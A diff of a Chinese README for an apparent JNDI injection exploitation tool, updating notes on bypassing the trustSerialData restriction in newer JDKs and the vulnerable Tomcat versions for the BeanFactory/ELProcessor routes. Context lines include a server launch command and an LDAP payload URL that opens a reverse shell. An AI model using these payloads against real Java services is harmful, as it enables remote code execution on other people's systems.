@@ -22,7 +22,11 @@ java -jar ysogate-[version]-all.jar -m jndi -i 0.0.0.0 -onlyRef
 
 ### trustSerialData 绕过
 
+> 在 OpenJDK 17.0.13 中，com.sun.jndi.ldap.object.trustSerialData 系统属性默认设置为 false。此发行版本还增加 com.sun.jndi.ldap.object.trustSerialData 属性的范围，以覆盖 javaRemoteLocation LDAP 属性中的 RMI 远程对象的重新构建。
+> 这些更改意味着，Java 对象透明序列化需要明确选择。从 OpenJDK 17.0.13 开始，如果要允许应用程序从 LDAP 属性重建 Java 对象和 RMI 存根，则必须明确将 com.sun.jndi.ldap.object.trustSerialData 属性设置为 true。
+
 在JDK20+版本中`com.sun.jndi.ldap.object.trustSerialData`属性默认为`false`，无法在com.sun.jndi.ldap.Obj#decodeObject中反序列化，绕过方式主要有：
+
 
 **ldap2rmi**
 
@@ -75,7 +79,7 @@ ldap://127.0.0.1:1389/Basic/ReverseShell/127.0.0.1/4444
 
 BeanFactory这个类在tomcat8+或者SpringBoot 1.2.x+存在
 
-且要求tomcat版本小于9.0.63，或小于8.5.79
+且要求tomcat版本需小于 8.5.79、9.0.63、10.0.21 或 10.1.0-M14
 
 **Tomcat ELProcessor**
 
